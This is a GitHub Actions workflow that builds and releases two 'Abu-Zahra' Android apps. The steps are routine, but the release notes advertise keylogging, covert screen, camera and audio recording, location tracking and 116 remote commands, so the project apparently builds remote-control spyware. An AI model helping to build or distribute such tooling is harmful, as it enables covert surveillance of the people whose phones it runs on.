name: Build Android APKs

on:
  push:
    branches: [main]
    paths:
      - 'Admin-App/**'
      - 'Android-App/**'
      - '.github/workflows/build.yml'
  workflow_dispatch:

jobs:
  build-admin:
    name: Build Admin App
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Build Admin App (Debug)
        working-directory: Admin-App
        run: |
          chmod +x gradlew
          ./gradlew assembleDebug

      - name: Upload Admin APK
        uses: actions/upload-artifact@v4
        with:
          name: Admin-App-APK
          path: Admin-App/app/build/outputs/apk/debug/*.apk

  build-manager:
    name: Build Manager App
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Build Manager App (Debug)
        working-directory: Android-App
        run: |
          chmod +x gradlew
          ./gradlew assembleDebug

      - name: Upload Manager APK
        uses: actions/upload-artifact@v4
        with:
          name: Android-App-APK
          path: Android-App/app/build/outputs/apk/debug/*.apk

  release:
    name: Create GitHub Release
    needs: [build-admin, build-manager]
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4

      - name: Download all artifacts
        uses: actions/download-artifact@v4

      - name: Rename APKs
        run: |
          mv Admin-App-APK/*.apk AbuZahra-Admin-v2.0.0.apk 2>/dev/null || true
          mv Android-App-APK/*.apk AbuZahra-Manager-v3.5.0.apk 2>/dev/null || true

      - name: Create Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: v2.0.0-${{ github.run_number }}
          name: "Abu-Zahra v2.0.0 Build #${{ github.run_number }}"
          body: |
            ## Abu-Zahra Admin & Manager Apps
            
            ### Admin App v2.0.0:
            - Firebase Auth (Google Sign-In + Email/Password + Create Account)
            - All 8 command categories (116 commands)
            - Live Streaming (Screen/Camera/Audio)
            - Data Viewer (12 data types)
            - Monitoring (Keylogger, Screen/Audio Record, Camera, Location)
            - User Management
            - Command Parameter Dialogs (32 commands)
            - Permanent Link Code per email
            
            ### Manager App v3.5.0:
            - Updated Firebase configuration
          
            ### SHA1 Fingerprint (Admin App):
            `0A:27:6F:32:73:15:92:AF:77:06:03:F8:4C:81:48:00:45:75:F4:D4`
          files: |
            AbuZahra-Admin-v2.0.0.apk
            AbuZahra-Manager-v3.5.0.apk
          draft: false
          prerelease: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}